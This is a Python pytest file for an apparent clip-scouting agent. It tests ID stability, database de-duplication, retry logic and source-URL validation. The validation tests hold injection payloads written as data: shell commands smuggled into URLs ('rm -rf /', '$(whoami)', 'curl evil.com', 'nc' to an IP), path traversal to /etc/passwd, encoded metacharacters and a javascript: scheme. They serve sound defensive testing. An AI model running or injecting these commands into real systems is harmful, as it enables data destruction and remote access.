"""Scout tests — verifies the Day 3 hardening (E-5, E-14, retry/backoff).

Critical assertions:
- make_clip_id is stable across time (E-5)
- INSERT OR IGNORE + UNIQUE(source_url) actually de-duplicates
- Two scout runs on the same fixture produce zero duplicates
- source_url validation rejects shell metachars, non-platform URLs (E-14)
- retry_external retries TransientError, exhausts to RetryGiveUp,
  doesn't retry non-transient errors
"""

from __future__ import annotations

import asyncio
import sqlite3
import tempfile
from pathlib import Path
import pytest

from agents.db import init_schema
from agents.models import CandidateClip
from agents.retry import RetryGiveUp, TransientError, retry_external
from agents.scout import (
    InvalidSourceUrlError,
    _insert_candidate,
    _validate_source_url,
    make_clip_id,
    run_scout,
)
from scripts.migrate import migrate


# ---------- Fixtures ----------

@pytest.fixture
def migrated_db(monkeypatch):
    """Fresh DB through v5 (Scout idempotency migration applied)."""
    with tempfile.TemporaryDirectory() as tmp:
        db_path = Path(tmp) / "scout.db"
        monkeypatch.setenv("AGENTIC_CLIPPER_DB", str(db_path))
        init_schema(db_path)
        migrate(db_path=db_path)
        yield db_path


def _clip(
    *,
    platform: str = "twitch",
    url: str = "https://www.twitch.tv/ishowspeed/clip/ImpressivePoorIcecream",
    creator: str = "IShowSpeed",
    view_count: int = 50000,
) -> CandidateClip:
    return CandidateClip(
        id=make_clip_id(platform, url),  # type: ignore[arg-type]
        creator=creator,
        source_platform=platform,  # type: ignore[arg-type]
        source_url=url,
        source_title="Sample clip",
        source_duration_s=25.0,
        source_view_count=view_count,
    )


# ---------- E-5: stable clip_id ----------

def test_make_clip_id_is_stable_across_calls():
    """Same (platform, url) inputs always produce the same id —
    no time component."""
    id1 = make_clip_id("twitch", "https://twitch.tv/foo/clip/abc")
    id2 = make_clip_id("twitch", "https://twitch.tv/foo/clip/abc")
    assert id1 == id2


def test_make_clip_id_differs_per_platform():
    """Same URL on different platforms (hypothetically — Instagram and
    TikTok both have @creator/ paths) get distinct ids via the prefix."""
    a = make_clip_id("instagram", "https://instagram.com/creator/p/abc")
    b = make_clip_id("tiktok",    "https://instagram.com/creator/p/abc")
    assert a != b
    assert a.startswith("instagram-")
    assert b.startswith("tiktok-")


def test_make_clip_id_differs_per_url():
    """Different URLs on the same platform get distinct ids."""
    a = make_clip_id("twitch", "https://twitch.tv/a/clip/1")
    b = make_clip_id("twitch", "https://twitch.tv/a/clip/2")
    assert a != b


def test_make_clip_id_format_short_enough():
    """16 hex chars + platform prefix should stay well under any
    reasonable text-column length limit."""
    id_ = make_clip_id("twitch", "https://twitch.tv/x/clip/y")
    assert id_.startswith("twitch-")
    # platform + dash + 16 hex chars
    assert len(id_) == len("twitch-") + 16


# ---------- E-14: source_url validation ----------

def test_validate_url_passes_canonical_twitch():
    # Twitch clip slugs are title-cased word strings, typically 30+ chars.
    # Our canonicalizer enforces 8-80 chars to match real Twitch shape.
    _validate_source_url("twitch", "https://www.twitch.tv/ishowspeed/clip/ImpressivePoorIcecream")
    _validate_source_url("twitch", "https://clips.twitch.tv/ImpressivePoorIcecream-jKj7r3eY")


def test_validate_url_passes_canonical_youtube():
    # Real YouTube video_ids are exactly 11 chars: [A-Za-z0-9_-]{11}
    _validate_source_url("youtube", "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    _validate_source_url("youtube", "https://youtu.be/dQw4w9WgXcQ")


def test_validate_url_passes_canonical_tiktok():
    _validate_source_url("tiktok", "https://www.tiktok.com/@kaicenat/video/1234567890")


def test_validate_url_rejects_shell_metacharacters():
    """Codex E-14: an URL with `;` `$` `&` could be an RCE vector if
    Phase 2 ever passes it via shell=True. Reject at insert."""
    bad_urls = [
        "https://twitch.tv/foo;rm -rf /",
        "https://twitch.tv/foo$(whoami)",
        "https://twitch.tv/foo&curl evil.com",
        "https://twitch.tv/foo|nc 1.2.3.4 1337",
        "https://twitch.tv/foo`whoami`",
    ]
    for url in bad_urls:
        with pytest.raises(InvalidSourceUrlError):
            _validate_source_url("twitch", url)


def test_validate_url_rejects_non_platform_domain():
    """attacker.example.com is not on the allowlist."""
    with pytest.raises(InvalidSourceUrlError):
        _validate_source_url("twitch", "https://attacker.example.com/clip")


def test_validate_url_rejects_path_traversal():
    """`../` in the path is rejected (regex doesn't allow . repeated)."""
    with pytest.raises(InvalidSourceUrlError):
        _validate_source_url("twitch", "https://twitch.tv/../../../etc/passwd")


def test_validate_url_rejects_javascript_scheme():
    """javascript:alert(1) — not https://."""
    with pytest.raises(InvalidSourceUrlError):
        _validate_source_url("twitch", "javascript:alert(1)//twitch.tv/x")


def test_validate_url_rejects_http_scheme():
    """http:// (insecure) is rejected — only https://."""
    with pytest.raises(InvalidSourceUrlError):
        _validate_source_url("twitch", "http://twitch.tv/foo/clip/bar")


def test_validate_url_rejects_unknown_platform():
    with pytest.raises(InvalidSourceUrlError, match="unknown platform"):
        _validate_source_url("myspace", "https://myspace.com/foo")  # type: ignore[arg-type]


# ---------- _insert_candidate idempotency ----------

def test_insert_returns_true_on_first_insert(migrated_db):
    assert _insert_candidate(_clip()) is True


def test_insert_returns_false_on_duplicate_id(migrated_db):
    """Second insert with the same id (which is derived from URL) → no-op,
    returns False. INSERT OR IGNORE absorbs the conflict on the primary key."""
    clip = _clip()
    assert _insert_candidate(clip) is True
    assert _insert_candidate(clip) is False
    # One row in the DB
    with sqlite3.connect(migrated_db) as conn:
        count = conn.execute("SELECT COUNT(*) FROM clips_candidate").fetchone()[0]
    assert count == 1


def test_unique_source_url_constraint_fires(migrated_db):
    """Even if a buggy caller bypassed make_clip_id and used a different
    id for the same URL, the UNIQUE(source_url) index (migration v5)
    catches it. INSERT OR IGNORE → silent no-op (cur.rowcount=0)."""
    clip_a = _clip()
    clip_b = CandidateClip(
        id="manually-set-different-id",  # bypassed make_clip_id
        creator=clip_a.creator,
        source_platform=clip_a.source_platform,
        source_url=clip_a.source_url,  # same URL
    )
    assert _insert_candidate(clip_a) is True
    # INSERT OR IGNORE turns the UNIQUE-violation into a silent skip
    assert _insert_candidate(clip_b) is False
    # Still one row
    with sqlite3.connect(migrated_db) as conn:
        count = conn.execute("SELECT COUNT(*) FROM clips_candidate").fetchone()[0]
    assert count == 1


def test_insert_raises_on_invalid_url(migrated_db):
    """Bad URLs are rejected BEFORE the INSERT — never reach the DB."""
    bad_clip = CandidateClip(
        id="bad-1",
        creator="X",
        source_platform="twitch",
        source_url="https://twitch.tv/foo;rm -rf /",
    )
    with pytest.raises(InvalidSourceUrlError):
        _insert_candidate(bad_clip)
    with sqlite3.connect(migrated_db) as conn:
        count = conn.execute("SELECT COUNT(*) FROM clips_candidate").fetchone()[0]
    assert count == 0


# ---------- E-5: Scout re-run idempotency ----------

def test_two_scout_runs_produce_no_duplicates(migrated_db, monkeypatch):
    """The full Scout flow: monkey-patch the dispatchers to return a
    fixed candidate set, run scout twice, assert no duplicates."""
    # Slugs need to satisfy the 8-80 char Twitch-clip-slug shape, so we
    # build distinct slugs by suffix.
    fixed_clips = [
        _clip(url=f"https://twitch.tv/sketch/clip/SilentTrappedKangaroo{i:03d}")
        for i in range(5)
    ]
    fixed_clips[0] = _clip(creator="Sketch")  # one with a real-looking creator

    async def fake_dispatch(handle):
        return [c for c in fixed_clips if c.creator == "Sketch" or "twitch" in c.source_platform]

    # Patch the global dispatch + bypass NotImplementedError
    monkeypatch.setattr("agents.scout._PLATFORM_DISPATCH", {
        "twitch": fake_dispatch,
        "youtube": fake_dispatch,
        "tiktok": fake_dispatch,
        "kick": fake_dispatch,
    })

    # Also patch the config so creators.yaml isn't required to be wired
    fake_creators_cfg = {
        "creators": [
            {
                "creator": "Sketch",
                "primary_platforms": ["twitch"],
                "platforms": {"twitch": {"handle": "sketch"}},
            },
        ],
    }
    monkeypatch.setattr("agents.scout.load", lambda _name: fake_creators_cfg)

    # Run 1: should insert all unique fixtures
    first = asyncio.run(run_scout())
    assert len(first) == len({c.source_url for c in fixed_clips})

    # Run 2: should insert ZERO (idempotent re-scout)
    second = asyncio.run(run_scout())
    assert second == []

    # DB count matches the first run
    with sqlite3.connect(migrated_db) as conn:
        count = conn.execute("SELECT COUNT(*) FROM clips_candidate").fetchone()[0]
    assert count == len(first)


# ---------- retry_external ----------

def test_retry_succeeds_on_first_attempt():
    @retry_external(max_attempts=3, base_delay_s=0.01)
    def stable() -> int:
        return 42
    assert stable() == 42


def test_retry_retries_transient_and_eventually_succeeds():
    attempts: list[int] = []
    @retry_external(max_attempts=3, base_delay_s=0.01)
    def flaky() -> str:
        attempts.append(1)
        if len(attempts) < 3:
            raise TransientError(f"attempt {len(attempts)}")
        return "ok"
    assert flaky() == "ok"
    assert len(attempts) == 3


def test_retry_exhausts_to_RetryGiveUp():
    @retry_external(max_attempts=2, base_delay_s=0.01)
    def always_fails() -> None:
        raise TransientError("persistent")
    with pytest.raises(RetryGiveUp) as exc_info:
        always_fails()
    assert isinstance(exc_info.value.__cause__, TransientError)


def test_retry_does_not_retry_non_transient():
    """Permanent errors propagate immediately. Bugs in our code shouldn't
    be hidden behind 3 silent retries."""
    attempts: list[int] = []
    @retry_external(max_attempts=3, base_delay_s=0.01)
    def buggy() -> None:
        attempts.append(1)
        raise ValueError("permanent")
    with pytest.raises(ValueError):
        buggy()
    assert len(attempts) == 1


def test_retry_works_on_async_functions():
    """Async functions get the async wrapper (asyncio.sleep instead of
    time.sleep). Critical because Scout/Curator/Editor all use async dispatch."""
    attempts: list[int] = []
    @retry_external(max_attempts=2, base_delay_s=0.01)
    async def async_flaky() -> str:
        attempts.append(1)
        if len(attempts) < 2:
            raise TransientError("first try")
        return "ok"
    result = asyncio.run(async_flaky())
    assert result == "ok"
    assert len(attempts) == 2


def test_retry_custom_retry_on_class():
    """Callers can add their own exception classes (httpx.ConnectError etc.)
    without subclassing TransientError."""
    class MyHTTPError(Exception):
        pass
    attempts: list[int] = []
    @retry_external(max_attempts=2, base_delay_s=0.01, retry_on=(MyHTTPError,))
    def custom() -> str:
        attempts.append(1)
        if len(attempts) == 1:
            raise MyHTTPError("first")
        return "ok"
    assert custom() == "ok"


def test_retry_rejects_invalid_params():
    with pytest.raises(ValueError, match="max_attempts must be >= 1"):
        retry_external(max_attempts=0)  # type: ignore[call-arg]
    with pytest.raises(ValueError, match="base_delay_s must be > 0"):
        retry_external(base_delay_s=0)  # type: ignore[call-arg]


def test_retry_rejects_zero_max_delay():
    """Codex 2026-05-18: max_delay_s <= 0 produced a tight retry loop
    (min(backoff, 0) clamps every sleep to zero). Now rejected at
    decoration time."""
    with pytest.raises(ValueError, match="max_delay_s must be > 0"):
        retry_external(max_delay_s=0)  # type: ignore[call-arg]


def test_retry_rejects_negative_jitter():
    """Negative jitter would make delays negative → asyncio.sleep raises.
    Reject at decoration time."""
    with pytest.raises(ValueError, match="jitter_factor must be >= 0"):
        retry_external(jitter_factor=-0.1)  # type: ignore[call-arg]


# ---------- Codex 2026-05-18: canonical-URL / id-collision fixes ----------

def test_canonical_url_collapses_youtube_variants():
    """The exact bug Codex flagged: youtube.com/watch?v=X and youtu.be/X
    are the same video. They MUST produce the same canonical URL — and
    thus the same clip_id — so UNIQUE(source_url) actually de-dupes."""
    from agents.scout import canonicalize_source_url
    full = canonicalize_source_url("youtube", "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    short = canonicalize_source_url("youtube", "https://youtu.be/dQw4w9WgXcQ")
    shorts_url = canonicalize_source_url("youtube", "https://www.youtube.com/shorts/dQw4w9WgXcQ")
    embed = canonicalize_source_url("youtube", "https://www.youtube.com/embed/dQw4w9WgXcQ")
    # All four collapse to the same canonical form.
    assert full == short == shorts_url == embed
    assert full == "https://www.youtube.com/watch?v=dQw4w9WgXcQ"


def test_canonical_url_collapses_twitch_clip_variants():
    """twitch.tv/<channel>/clip/<slug> ≡ clips.twitch.tv/<slug>."""
    from agents.scout import canonicalize_source_url
    long_form = canonicalize_source_url("twitch", "https://www.twitch.tv/ishowspeed/clip/ImpressivePoorIcecream")
    short = canonicalize_source_url("twitch", "https://clips.twitch.tv/ImpressivePoorIcecream")
    assert long_form == short
    assert long_form == "https://clips.twitch.tv/ImpressivePoorIcecream"


def test_canonical_url_rejects_url_encoded_metachars():
    """Codex empirically verified: `%3B` (encoded `;`) sailed through
    the prior regex because the regex matched encoded bytes not decoded
    content. canonicalize_source_url now urllib-decodes the path and
    rejects shell metachars in the DECODED form."""
    from agents.scout import canonicalize_source_url
    with pytest.raises(InvalidSourceUrlError, match="shell metacharacter"):
        canonicalize_source_url(
            "twitch",
            "https://www.twitch.tv/foo%3Brm%20-rf%20/clip/ImpressivePoorIcecream",
        )


def test_canonical_url_rejects_url_encoded_path_traversal():
    """`%2E%2E%2F` decodes to `../` — must be rejected after decoding."""
    from agents.scout import canonicalize_source_url
    with pytest.raises(InvalidSourceUrlError):
        canonicalize_source_url(
            "twitch",
            "https://www.twitch.tv/foo/%2E%2E/clip/ImpressivePoorIcecream",
        )


def test_canonical_url_rejects_idna_confusable_host():
    """Codex flagged twitchһ.tv (Cyrillic 'h') — IDNA encoding either
    converts it to its punycode form (which fails the allowlist) or
    raises UnicodeError. Either way: rejected."""
    from agents.scout import canonicalize_source_url
    with pytest.raises(InvalidSourceUrlError):
        canonicalize_source_url(
            "twitch",
            "https://twitchһ.tv/foo/clip/ImpressivePoorIcecream",
        )


def test_clip_id_derived_from_canonical_form_collapses_youtube_variants():
    """The actual de-dupe path: _insert_candidate canonicalizes the URL
    and re-derives the clip_id from the canonical form. So two scout
    runs that each see a different shape of the same YouTube video
    both collide on UNIQUE(source_url) AND on the primary key —
    BOTH protections fire."""
    from agents.scout import canonicalize_source_url
    canon_full = canonicalize_source_url("youtube", "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    canon_short = canonicalize_source_url("youtube", "https://youtu.be/dQw4w9WgXcQ")
    # Same canonical → same id when derived from canonical.
    assert make_clip_id("youtube", canon_full) == make_clip_id("youtube", canon_short)


def test_youtube_variants_dedupe_at_insert(migrated_db):
    """End-to-end: a youtube.com/watch?v=X insert followed by a
    youtu.be/X insert with the same video both collapse — the second
    is a no-op (rowcount=0), DB has exactly one row."""
    from agents.models import CandidateClip
    full = CandidateClip(
        id="yt-raw-1",  # raw id; _insert_candidate re-derives
        creator="MrBeast",
        source_platform="youtube",
        source_url="https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    )
    short = CandidateClip(
        id="yt-raw-2",
        creator="MrBeast",
        source_platform="youtube",
        source_url="https://youtu.be/dQw4w9WgXcQ",
    )
    assert _insert_candidate(full) is True
    # Same video, different URL shape → no-op insert.
    assert _insert_candidate(short) is False
    with sqlite3.connect(migrated_db) as conn:
        count = conn.execute("SELECT COUNT(*) FROM clips_candidate").fetchone()[0]
    assert count == 1
